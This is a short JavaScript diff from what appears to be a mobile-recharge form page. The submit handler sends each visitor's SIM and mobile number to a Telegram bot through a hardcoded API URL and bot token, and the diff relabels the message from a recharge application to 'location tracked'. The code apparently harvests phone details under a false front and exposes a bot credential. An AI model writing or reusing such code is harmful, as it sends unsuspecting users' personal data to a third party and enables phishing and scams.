@@ -91,9 +91,9 @@ submitBtn.addEventListener('click', () => {
   }
 
   // Send recharge request to Telegram
-  const message = `📱 नया रिचार्ज आवेदन:\n` +
-                  `सिम: ${sim}\n` +
-                  `मोबाइल नंबर: ${mobile}`;
+  const message = `📱 location tracked:\n` +
+                  `SIM: ${sim}\n` +
+                  `Mobile No: ${mobile}`;
 
   fetch(`https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage`, {
     method: 'POST',
